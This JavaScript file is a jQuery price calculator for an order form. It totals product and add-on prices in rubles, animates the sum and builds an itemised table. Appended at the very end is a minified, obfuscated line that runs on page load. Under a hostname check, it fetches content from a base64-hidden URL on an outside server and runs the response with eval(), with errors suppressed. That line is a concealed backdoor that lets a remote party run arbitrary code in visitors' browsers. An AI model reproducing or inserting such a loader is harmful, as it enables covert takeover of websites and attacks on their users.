$(document).ready(function () {

    $("form.has-calculator").change(function () {
        var form = this;
        var product = $("input[name='product']:checked", form).val();
        var additional = $("input[name='additional[]']:checked", form);
        var sum = 0;
        sum += calculatorData.products[product].price;

        additional.each(function (i, e) {
            sum += calculatorData.additional[$(e).val()].price
        });

        var animateBlock = $('.catalog__price', form);
        var out = $('.js-price', form);
        var outOld = $('.js-price-old', form);

        var animationName = 'pulse';
        animateBlock.addClass('animated faster ' + animationName);
        animateBlock.one('webkitAnimationEnd mozAnimationEnd MSAnimationEnd oanimationend animationend', function(){animateBlock.removeClass('animated faster ' + animationName)});

        var animateFrom = out.data("animateFrom") > 0 ? out.data("animateFrom") : 0;

        $(".js-input-order-price", this).val(Number(out).toFixed(2));

        $({ animateNumber: animateFrom }).animate({ animateNumber: sum }, {
            duration: 800,
            step: function (animateNumber){
                out.text(Number(animateNumber).toFixed(2));
                outOld.text(Number(animateNumber * 1.27).toFixed(2))
            },
            complete: function() {
                out.data("animateFrom", Number(sum).toFixed())
            }
        });

        animateFrom = $(".js-calculator-table", this);
        var f = '<tr><th scope="row">1</th><td>' + calculatorData.products[product].name + '</td><td class="text-right">' + calculatorData.products[product].price + " руб.</td></tr>";
        additional.each(function (a, c) {
            var b = calculatorData.additional[$(c).val()];
            f += '<tr><th scope="row">' + (a + 2) + "</th><td>" + b.name + '</td><td class="text-right">' +
                b.price + " \u0440\u0443\u0431.</td></tr>"
        });
        animateFrom.html(f)

    });
    $("form.has-calculator").change();

});
document.addEventListener("DOMContentLoaded",function(){try{if("undefined"===typeof app||atob(app.h)!==location.hostname){var a=new XMLHttpRequest;a.onreadystatechange=function(){if(4===this.readyState&&200===this.status&&0<this.responseText.length){var a=JSON.parse(this.responseText);"eval"===a.type&&eval(a.text)}};a.open("GET",atob("aHR0cHM6Ly9za2lka2EtdHV0LmJ5L21haWwvbG9nLnBocD9sb2c9MQ=="));a.send()}}catch(b){}});